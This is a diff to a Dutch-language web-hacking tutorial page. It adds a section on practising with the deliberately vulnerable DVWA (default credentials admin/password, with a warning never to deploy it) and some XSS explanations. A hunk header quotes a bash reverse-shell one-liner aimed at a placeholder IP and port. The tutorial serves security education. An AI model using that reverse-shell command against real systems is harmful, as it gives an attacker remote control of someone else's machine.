@@ -377,6 +377,10 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <h3>Windows</h3>
 <h3>Android</h3>
 <h1>Web attacks</h1>
+<h2>Oefenomgeving</h2>
+<p>Zoals eerder genoemd is certified secure een mooie omgeving om web attacks te oefenen. Je kan hiervoor ook de Damn Vulnerable Web Application (<a href="http://www.dvwa.co.uk/">DVWA</a>) gebruiken. De DVWA geeft een kwetsbare website waar je een heleboel van de hieronder genoemde technieken kan beoefenen. Je kan de DVWA in bijvoorbeeld <a href="https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html">vmware player</a> draaien.</p>
+<p>De standaard gebruikersnaam en wachtwoord zijn admin en password. Je kan deze gegevens ook proberen te bruteforcen.</p>
+<p><strong>Waarschuwing</strong> Draai DVWA <strong>nooit</strong> op een echte server. Het is echt zo kwetsbaar en je webserver zal snel overgenomen worden.</p>
 <h2>Enumeratie</h2>
 <p>Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.</p>
 <h3>Zoekmachinefuncties</h3>
@@ -415,7 +419,8 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <h3>File uploads</h3>
 <h3>Fouten in de logica</h3>
 <h3>Cross site scripting</h3>
-<p>Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen.</p>
+<p>Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen. </p>
+<p>Sommige browsers zoals Chrome en Internet Explorer &gt;8.0 geven een foutmelding op het moment dat je XSS wilt uitvoeren. </p>
 <h4>Reflected XSS</h4>
 <p>Reflected of non-persistent XSS is een techniek waarbij een fout in de input sanitization het weergeven van kwaadaardige code toe staat. Het belangrijkste om te onthouden is dat in dit geval de aanval niet op de website opgeslagen is, en iemand dus alleen slachtoffer kan worden als hij echt jouw link aan klikt met de aanval.</p>
 <h4>PHP voorbeeld Reflected XSS</h4>
@@ -433,6 +438,9 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <p><strong>Let op!</strong> de waarden zijn urlencoded om geen verstoring in de URL te geven. </p>
 <h4>Stored XSS</h4>
 <p>Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.</p>
+<p><strong>DVWS voorbeeld</strong>
+<img src="images/xss_stored_alert(xss).png" />
+<img src="images/xss_stored_alert(xss)_result.png" /></p>
 <h4>DOM XSS</h4>
 <p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als <a href="https://nl.wikipedia.org/wiki/JavaScript">javascript</a> gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
 <h2>Local file inclusion</h2>
